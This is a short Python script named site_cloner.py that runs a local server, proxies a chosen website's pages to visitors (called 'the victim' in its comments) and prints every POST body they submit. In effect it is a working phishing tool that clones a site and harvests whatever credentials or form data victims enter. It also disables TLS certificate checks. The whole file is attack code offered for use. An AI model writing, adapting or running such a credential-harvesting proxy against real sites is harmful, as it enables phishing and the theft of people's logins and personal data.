import sys, socketserver, http.server, ssl, requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#a very basic and buggy site cloner script
#python3 site_cloner.py [url_to_clone] [ip] [port]


if len(sys.argv) != 4:

    print("[~] Usage : python3 site_cloner.py [url_to_clone] [ip] [port]")
    exit()

clone_url = sys.argv[1]
ip = sys.argv[2]
port = int(sys.argv[3])

class Handler (http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        incoming_url = self.path[1:]
        incoming_headers = self.headers
        print(incoming_headers)

        #proxy

        proxied_url = clone_url+incoming_url

        #find resource content type on proxied url, so we can correctly set it for the victim

        h = requests.head(proxied_url,verify=False)
        header = h.headers
        content_type = header.get('content-type')
        if content_type is None:
            content_type = 'application/octet-stream'

        #render content to the victim according to prefetched content type

        elif content_type == 'application/binary':  #some sites resolve their content type to application/binary, which results in the victim's browser just downloading a random file. So here we correctly set it to text/html 
            content_type = 'text/html'
       
        if 'image' in content_type: 
            resp = requests.get(proxied_url,verify=False,stream=True)
            print(resp.status_code)
            self.send_response(resp.status_code)
            self.send_header('Content-Type', content_type)
            self.end_headers()
            print(proxied_url)
            print(resp.status_code)
            resp.raw.decode_content = True
            self.wfile.write(resp.content)
        else:
            resp = requests.get(proxied_url,verify=False)
            print(resp.status_code)
            self.send_response(resp.status_code)
            self.send_header('Content-Type', content_type)
            self.end_headers()
            self.wfile.write(resp.text.encode())
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length) 
        print("POST REQUEST:\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n" % (str(self.path), str(self.headers), post_data.decode('utf-8')))

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer((ip, port), Handler) as httpd:
        print("url: http://"+ip+":"+str(port)+"/")
        httpd.serve_forever()
